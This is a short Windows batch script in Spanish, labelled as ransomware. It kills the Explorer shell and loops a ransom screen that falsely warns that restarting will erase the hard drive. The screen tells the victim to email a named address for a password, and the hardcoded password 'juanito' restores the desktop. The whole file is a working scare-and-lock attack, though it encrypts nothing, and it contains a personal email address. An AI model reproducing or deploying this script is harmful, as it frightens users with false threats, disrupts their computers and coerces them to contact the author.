color 0A
@echo off 
title ESTO ES UN RANSOMWARE 
taskkill /f /im explorer.exe 
:bucle 
cls               
echo =============================================
echo                LEE CON ATENCION!.
echo =============================================
echo NO REINICIAR LA COMPUTADORA!.
echo AL REINICAR SE ELIMINARA TODOS LOS DATOS DEL DISCO DURO!
echo SI USTED CIERRA ESTA VENTANA NO PODRA RECUPERAR SU COMPUTADORA!.
echo ESCRIBIR A jmgonzalez823@misena.edu.co 
echo =============================================
echo ingresar el password que recibio por correo
echo =============================================
set /p pass=ESCRIBA AQUI EL PASSWORD: 
if %pass%==juanito (goto passcorrecto) ELSE (goto bucle)
:passcorrecto
echo Felicidades!
start explorer.exe 
pause
exit